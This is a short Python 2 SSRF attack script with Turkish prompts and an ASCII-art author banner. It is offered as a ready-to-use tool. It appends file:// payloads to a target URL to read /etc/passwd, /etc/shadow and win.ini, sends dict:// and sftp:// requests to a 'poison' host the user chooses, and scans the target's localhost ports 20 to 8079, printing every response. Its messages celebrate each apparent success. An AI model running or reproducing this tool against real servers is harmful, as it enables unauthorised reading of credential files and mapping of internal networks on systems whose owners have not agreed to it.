import requests
from bs4 import BeautifulSoup

print """coded by sm1l3
:'######::'##::::'##::::'##:::'##::::::::'#######::
'##... ##: ###::'###::'####::: ##:::::::'##.... ##:
 ##:::..:: ####'####::.. ##::: ##:::::::..::::: ##:
. ######:: ## ### ##:::: ##::: ##::::::::'#######::
:..... ##: ##. #: ##:::: ##::: ##::::::::...... ##:
'##::: ##: ##:.:: ##:::: ##::: ##:::::::'##:::: ##:
. ######:: ##:::: ##::'######: ########:. #######::
:......:::..:::::..:::......::........:::.......:::



----------->  ssrf  server bazli istek sahteciligi"""


print "1) file:///..."
print "2) dict://"
print "3) sftp://"
print "4) port tarama"
soru1 = raw_input("type ---> ")


if soru1 == '1':
   url = raw_input("url --> ")
   r = requests.get(url+"file:///etc/passwd/")
   if r.status_code == 200:
      print "avlandin gulum dizin /etc/passwd/"

   r = requests.get(url+"file:///C:/Windows/win.ini")
   if r.status_code == 200:
      print "avlandin gulum dizin C:/Windows/win.ini"


   r = requests.get(url+"file:///etc/shadow/")
   if r.status_code == 200:
      print "avlandin gulum dizin etc/shadow"

   
if soru1 == '2':
   url = raw_input("url --> ")
   poison = raw_input("poison url or ip --> ")
   r = requests.get(url+"dict://"+poison)
   if r.status_code == 200:
      print "exploit edilmistir ho brom..."




if soru1 == '3':
   url = raw_input("url --> ")
   poison = raw_input("poison ftp server --> ")

   r= requests.get(url+"sftp://"+poison)
   if r.status_code == 200:
      print "kral hayirli osssun"



if soru1 == '4':
   url = raw_input("url --> ")
   for i in range(20,8080):
       r = requests.get(url+"http://127.0.0.1:%s" % i)
       html = r.content
       print (html)
